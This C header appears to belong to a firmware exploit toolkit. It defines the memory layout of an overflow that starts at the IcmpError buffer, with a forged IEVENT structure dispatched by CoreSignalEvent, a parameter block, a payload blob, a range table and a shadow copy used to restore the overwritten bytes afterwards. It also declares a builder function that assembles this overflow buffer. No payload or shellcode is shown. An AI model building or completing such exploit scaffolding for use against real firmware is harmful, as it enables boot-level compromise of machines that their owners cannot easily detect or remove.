#ifndef LAYOUT_H
#define LAYOUT_H

#include <stdint.h>
#include <stddef.h>
#include "graft.h"

/* The overflow region, as it exists in memory starting at &Mode->IcmpError.
 *
 *     +0x000  filler                      (in the IcmpError buffer itself)
 *     +EVENT  IEVENT graft        0x48    <- dispatched by CoreSignalEvent
 *     +0x080  parameter block     0x50
 *     +0x100  payload blob        N
 *     +align  range table         16*k
 *     +align  shadow copy         0x48
 *
 * Every pointer in the parameter block is absolute and derived from pool_base,
 * so the same layout works for a real firmware and for the host simulator.
 */
#define OVF_EVENT_DELTA  0x000u
#define OVF_PARAM_DELTA  0x080u
#define OVF_PAYLOAD_DELTA 0x100u

typedef struct {
  uint64_t pool_base;     /* &Mode->IcmpError */
  uint64_t event_off;     /* OVF_EVENT_DELTA + any per-build shift */
  uint64_t uart;
  uint64_t out_buf;
  uint64_t out_cap;
} layout_cfg_t;

typedef struct {
  uint8_t *buf;           /* overflow bytes, starting at EVENT */
  size_t   len;
  uint64_t event_addr;
  uint64_t param_addr;
  uint64_t payload_addr;
  uint64_t ranges_addr;
  uint64_t shadow_addr;
  uint64_t notify_tpl;
} layout_out_t;

/* Builds into a caller-provided buffer.  `payload` is the raw .text blob;
 * `ranges` is a packed array of {u64 start; u64 end;} pairs; `shadow` is the
 * pristine 0x48 bytes of the IEVENT that will be overwritten. */
int layout_build(uint8_t *buf, size_t cap, const layout_cfg_t *cfg,
                 const uint8_t *payload, size_t payload_len,
                 const uint8_t *ranges, size_t range_n,
                 const uint8_t *shadow, layout_out_t *out);

/* Locate a pattern inside a blob (used by the simulator to prove the
 * restoration actually reinstates the pre-attack bytes). */
size_t layout_find(const uint8_t *hay, size_t n, const uint8_t *needle,
                   size_t m);

#endif
